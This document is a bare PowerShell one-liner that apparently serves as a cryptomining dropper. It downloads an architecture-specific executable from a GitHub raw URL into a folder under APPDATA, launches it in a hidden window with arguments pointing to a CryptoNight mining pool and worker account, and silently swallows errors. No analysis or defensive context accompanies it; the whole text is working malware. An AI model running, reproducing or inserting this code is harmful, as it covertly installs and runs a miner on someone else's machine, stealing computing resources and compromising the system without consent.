if($env:PROCESSOR_ARCHITECTURE -eq "x86"){$jd = 'https://raw.githubusercontent.com/jommb/872/master/m2'}Else{$jd = 'https://raw.githubusercontent.com/jommb/872/master/b2'} New-Item -ItemType Directory -Force ($env:APPDATA+'\kina\'); &{ Try { (new-object System.Net.WebClient).DownloadFile($jd, ($env:APPDATA+'\kina\grdt.exe')); Start-Process -WindowStyle hidden $env:APPDATA'\kina\grdt.exe' '-q -o stratum+tcp://europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x --safe --keepalive -B'} Catch {} };